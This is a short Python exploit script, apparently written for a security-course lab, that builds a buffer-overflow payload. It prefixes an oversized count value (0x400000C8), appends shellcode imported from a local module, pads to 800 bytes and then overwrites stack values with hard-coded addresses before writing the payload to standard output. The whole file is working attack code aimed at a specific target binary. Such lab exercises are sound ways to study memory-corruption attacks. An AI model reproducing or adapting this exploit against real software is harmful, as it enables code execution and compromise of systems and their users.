from shellcode import shellcode
import sys

if __name__ == '__main__':
    first = 0x400000C8
    #count from spec
    attack = first.to_bytes(4, "little")
    attack += shellcode
    attack += b"a" * (800 - len(shellcode))
    attack += 0xfff692b8.to_bytes(4, "little")
    attack += 0x00000004.to_bytes(4, "little")
    attack += 0x00000001.to_bytes(4, "little")
    attack += 0x080e22e0.to_bytes(4, "little")
    attack += 0x00000000.to_bytes(4, "little")
    attack += 0x400000c8.to_bytes(4, "little")
    attack += 0xfff68f80.to_bytes(4, "little")
    attack += 0x080e22e0.to_bytes(4, "little")
    attack += 0x00000000.to_bytes(4, "little")
    attack += 0x080de000.to_bytes(4, "little")
    attack += 0xfff692e8.to_bytes(4, "little")
    attack += 0xfff68f80.to_bytes(4, "little")

    sys.stdout.buffer.write(attack)